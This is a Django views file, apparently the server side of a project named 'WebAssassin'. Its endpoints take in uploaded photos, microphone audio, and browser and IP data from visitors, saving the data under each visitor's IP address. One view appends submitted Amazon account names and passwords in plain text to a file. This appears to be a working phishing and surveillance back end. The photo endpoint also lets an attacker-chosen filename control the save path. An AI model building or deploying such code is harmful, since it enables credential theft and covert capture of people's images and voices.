from django.shortcuts import render
from django.shortcuts import redirect
import os
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt 
import json
import os

pathtosave = "/home/lanjithkumar/programming/WebAssassin_backup/photosimages"
pathtosavefortext = "/home/lanjithkumar/programming/WebAssassin_backup/audiofiles"

def homepage(request):
    return render(request, 'main.html')

@csrf_exempt  
def photosave(request):
    if request.method == 'POST' and 'photo' in request.FILES:
        photo = request.FILES['photo']

        full_path = os.path.join(pathtosave, photo.name)

        with open(full_path, 'wb') as destination:
            for chunk in photo.chunks():
                destination.write(chunk)

        return JsonResponse({'message': 'Image saved successfully'})
    else:
        return JsonResponse({'error': 'Invalid request'}, status=400)

@csrf_exempt
def browserdata(request):
    if request.method == 'POST':
        try:
            data = json.loads(request.body)
            
            ip_info = data.get('ipInfo', {})
            ip_address = ip_info.get('ip', 'unknown')

            sanitized_ip_address = ip_address.replace('.', '_')

            save_directory = "/home/lanjithkumar/programming/WebAssassin_backup/ipinfofiles"

            filename = os.path.join(save_directory, f'{sanitized_ip_address}.txt')

            os.makedirs(save_directory, exist_ok=True)

            with open(filename, 'w') as file:
                json.dump(data, file, indent=4)
            
            return JsonResponse({'message': 'Data received and saved successfully'})
        except json.JSONDecodeError:
            return JsonResponse({'error': 'Invalid JSON data'}, status=400)
    else:
        return JsonResponse({'error': 'Invalid request method'}, status=400)

@csrf_exempt
def micfile(request):
    if request.method == 'POST' and 'audio_data' in request.FILES:
        audio_file = request.FILES['audio_data']
        save_path = "/home/lanjithkumar/programming/WebAssassin_backup/audiofiles"  

        file_name = os.path.join(save_path, 'received_audio.wav')

        with open(file_name, 'wb') as destination:
            for chunk in audio_file.chunks():
                destination.write(chunk)

        return JsonResponse({'message': 'Audio received and processed successfully.'})

    return JsonResponse({'error': 'Invalid request'}, status=400)

def savetheid(request):
    if request.method == 'POST':
        accntpath = "/home/lanjithkumar/programming/WebAssassin_backup/Accountinfo/main.txt"
        amazon_account = request.POST.get('amazon_account')  
        password = request.POST.get('password')
        with open(accntpath, 'a') as file:
            file.write(f"Amazon Account: {amazon_account}, Password: {password}\n")

            return redirect('/')
